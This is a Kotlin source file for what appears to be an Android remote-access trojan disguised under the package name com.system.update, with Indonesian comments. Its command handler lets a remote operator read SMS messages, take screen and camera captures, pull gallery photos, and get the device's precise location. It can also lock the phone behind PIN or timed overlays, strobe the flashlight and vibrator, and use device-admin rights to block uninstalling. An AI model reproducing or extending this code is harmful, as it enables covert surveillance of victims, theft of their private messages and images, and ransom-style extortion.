package com.system.update

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.location.Geocoder
import android.location.LocationManager
import android.media.AudioManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import android.view.View
import android.view.WindowManager
import com.google.gson.JsonObject
import java.net.NetworkInterface
import java.util.Locale

class CommandHandler(private val ctx: Context, private val deviceId: String) {

    companion object {
        @Volatile var lockPin: String? = null
        @Volatile var lockHard: Boolean = false
        @Volatile var lockUntil: Long = 0L
        @Volatile var flashSpam: Boolean = false
        @Volatile var vibrateSpam: Boolean = false
        @Volatile var crashClick: Boolean = false
        @Volatile var antiUninstall: Boolean = true

        // Simpan overlay yang sedang aktif biar bisa di-remove
        var activeLockView: View? = null
        var activeHardView: View? = null
        var activeTimerView: View? = null
        var activeCrashView: View? = null
    }

    private val wm: WindowManager
        get() = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    // ============================================================
    // COLLECT DEVICE INFO
    // ============================================================
    fun collectInfo(): Map<String, Any> {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(memInfo)
        val ramGb = String.format(Locale.US, "%.1f GB", memInfo.totalMem / 1e9)

        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val carrier = try { tm.networkOperatorName ?: "-" } catch (_: Exception) { "-" }

        val tz = java.util.TimeZone.getDefault().id
        val ip = getLocalIp()

        return mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "android" to Build.VERSION.RELEASE,
            "battery" to battery,
            "ram" to ramGb,
            "carrier" to carrier,
            "timezone" to tz,
            "ip" to ip,
            "sdk" to Build.VERSION.SDK_INT
        )
    }

    private fun getLocalIp(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .flatMap { it.inetAddresses.toList() }
                .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                ?.hostAddress ?: "-"
        } catch (_: Exception) { "-" }
    }

    // ============================================================
    // EXECUTE COMMAND
    // ============================================================
    fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
        when (cmd) {
            "lock_pin" -> cmdLockPin(args, done)
            "lock_hard" -> cmdLockHard(done)
            "lock_time" -> cmdLockTime(args, done)
            "sms" -> cmdSms(done)
            "screen" -> cmdScreen(done)
            "camera_front" -> cmdCamera(true, done)
            "camera_back" -> cmdCamera(false, done)
            "flash" -> cmdFlash(done)
            "vibrate" -> cmdVibrate(done)
            "ip" -> cmdIp(done)
            "crash" -> cmdCrash(done)
            "gallery" -> cmdGallery(done)
            "anti_uninstall" -> cmdAntiUninstall(done)
            else -> done(mapOf("error" to "unknown command: $cmd"))
        }
    }

    // ============================================================
    // 1. LOCK PIN
    // ============================================================
    private fun cmdLockPin(args: JsonObject?, done: (Any) -> Unit) {
        val pin = args?.get("pin")?.asString ?: "1234"
        lockPin = pin
        showLockPinOverlay()
        done(mapOf("ok" to true, "pin" to pin))
    }

    private fun showLockPinOverlay() {
        try {
            activeLockView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
            val view = LockOverlayView.buildPin(ctx, lockPin ?: "1234") { v ->
                try { wm.removeView(v) } catch (_: Exception) {}
                activeLockView = null
                lockPin = null
            }
            wm.addView(view, LockOverlayView.paramsFull())
            activeLockView = view
        } catch (_: Exception) {}
    }

    // ============================================================
    // 2. LOCK HARD
    // ============================================================
    private fun cmdLockHard(done: (Any) -> Unit) {
        lockHard = true
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                @Suppress("DEPRECATION")
                dpm.lockNow()
            }
        } catch (_: Exception) {}

        // Overlay tetap muncul
        try {
            activeHardView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
            val view = LockOverlayView.buildHard(ctx)
            wm.addView(view, LockOverlayView.paramsFull())
            activeHardView = view
        } catch (_: Exception) {}

        done(mapOf("ok" to true, "hard" to true))
    }

    // ============================================================
    // 3. LOCK JAM
    // ============================================================
    private fun cmdLockTime(args: JsonObject?, done: (Any) -> Unit) {
        val hours = args?.get("hours")?.asLong ?: 5L
        val durationMs = hours * 3600_000L
        lockUntil = System.currentTimeMillis() + durationMs

        try {
            activeTimerView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
            val view = LockOverlayView.buildTimer(ctx, durationMs) { v ->
                try { wm.removeView(v) } catch (_: Exception) {}
                activeTimerView = null
                lockUntil = 0
            }
            wm.addView(view, LockOverlayView.paramsFull())
            activeTimerView = view
        } catch (_: Exception) {}

        done(mapOf("ok" to true, "hours" to hours, "until" to lockUntil))
    }

    // ============================================================
    // 4. SMS
    // ============================================================
    private fun cmdSms(done: (Any) -> Unit) {
        val messages = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    messages.add(mapOf(
                        "app" to addr,
                        "body" to body,
                        "date" to date.toString()
                    ))
                }
            }
        } catch (_: Exception) {}
        done(mapOf("type" to "sms", "messages" to messages))
    }

    // ============================================================
    // 5. SCREEN CAPTURE
    // ============================================================
    private fun cmdScreen(done: (Any) -> Unit) {
        if (ScreenCapture.isReady()) {
            ScreenCapture.capture(ctx) { b64 ->
                if (b64 != null) done(mapOf("type" to "image", "data" to b64))
                else done(mapOf("type" to "text", "data" to "Screen capture gagal"))
            }
        } else {
            done(mapOf("type" to "text", "data" to "MediaProjection belum aktif — buka app dan izinkan"))
        }
    }

    // ============================================================
    // 6 & 7. CAMERA
    // ============================================================
    private fun cmdCamera(front: Boolean, done: (Any) -> Unit) {
        CameraCapture(ctx).capture(front) { b64 ->
            if (b64 != null) done(mapOf("type" to "image", "data" to b64))
            else done(mapOf("type" to "text", "data" to "Gagal capture kamera ${if (front) "depan" else "belakang"}"))
        }
    }

    // ============================================================
    // 8. FLASH KEDIP
    // ============================================================
    private fun cmdFlash(done: (Any) -> Unit) {
        flashSpam = !flashSpam
        if (flashSpam) startFlashSpam()
        done(mapOf("flash" to flashSpam, "active" to flashSpam))
    }

    private fun startFlashSpam() {
        Thread {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            while (flashSpam) {
                try {
                    val id = cm.cameraIdList.firstOrNull {
                        cm.getCameraCharacteristics(it)
                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                    } ?: break
                    cm.setTorchMode(id, true)
                    Thread.sleep(120)
                    cm.setTorchMode(id, false)
                    Thread.sleep(120)
                } catch (_: Exception) { break }
            }
        }.start()
    }

    // ============================================================
    // 9. GETARAN
    // ============================================================
    private fun cmdVibrate(done: (Any) -> Unit) {
        vibrateSpam = !vibrateSpam
        if (vibrateSpam) startVibrateSpam()
        done(mapOf("vibrate" to vibrateSpam, "active" to vibrateSpam))
    }

    private fun startVibrateSpam() {
        val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        Thread {
            while (vibrateSpam) {
                try {
                    if (Build.VERSION.SDK_INT >= 26) {
                        vm.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION") vm.vibrate(800)
                    }
                    Thread.sleep(1200)
                } catch (_: Exception) { break }
            }
        }.start()
    }

    // ============================================================
    // 10. IP + LOKASI REAL
    // ============================================================
    private fun cmdIp(done: (Any) -> Unit) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var lat = 0.0
        var lon = 0.0
        var address = "-"
        try {
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
            if (loc != null) {
                lat = loc.latitude
                lon = loc.longitude
                try {
                    @Suppress("DEPRECATION")
                    val geocoder = Geocoder(ctx, Locale.getDefault())
                    val addrs = geocoder.getFromLocation(lat, lon, 1)
                    if (!addrs.isNullOrEmpty()) {
                        val a = addrs[0]
                        address = listOfNotNull(
                            a.thoroughfare,
                            a.subLocality,
                            a.locality,
                            a.administrativeArea,
                            a.countryName
                        ).joinToString(", ")
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        done(mapOf(
            "type" to "ip",
            "ip" to getLocalIp(),
            "lat" to lat,
            "lon" to lon,
            "address" to address
        ))
    }

    // ============================================================
    // 11. CRASH CLICK
    // ============================================================
    private fun cmdCrash(done: (Any) -> Unit) {
        crashClick = !crashClick
        if (crashClick) {
            try {
                activeCrashView?.let { try { wm.removeView(it) } catch (_: Exception) {} }
                val view = LockOverlayView.buildCrash(ctx) { v ->
                    try { wm.removeView(v) } catch (_: Exception) {}
                    activeCrashView = null
                    crashClick = false
                }
                wm.addView(view, LockOverlayView.paramsFull())
                activeCrashView = view
            } catch (_: Exception) {}
        } else {
            try {
                activeCrashView?.let { wm.removeView(it) }
                activeCrashView = null
            } catch (_: Exception) {}
        }
        done(mapOf("crash" to crashClick, "active" to crashClick))
    }

    // ============================================================
    // 12. GALLERY
    // ============================================================
    private fun cmdGallery(done: (Any) -> Unit) {
        val items = mutableListOf<Map<String, String>>()
        try {
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID),
                null, null, "date_added DESC LIMIT 20"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                    )
                    val b64 = try {
                        val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
                        if (bytes.size < 200_000)
                            Base64.encodeToString(bytes, Base64.NO_WRAP)
                        else ""
                    } catch (_: Exception) { "" }
                    if (b64.isNotEmpty()) items.add(mapOf("data" to b64))
                }
            }
        } catch (_: Exception) {}
        done(mapOf("type" to "gallery", "items" to items))
    }

    // ============================================================
    // 13. ANTI UNINSTALL
    // ============================================================
    private fun cmdAntiUninstall(done: (Any) -> Unit) {
        antiUninstall = !antiUninstall
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                if (antiUninstall) {
                    // Admin aktif = uninstall diblokir
                } else {
                    dpm.removeActiveAdmin(admin)
                }
            }
        } catch (_: Exception) {}
        done(mapOf("anti_uninstall" to antiUninstall, "active" to antiUninstall))
    }
}
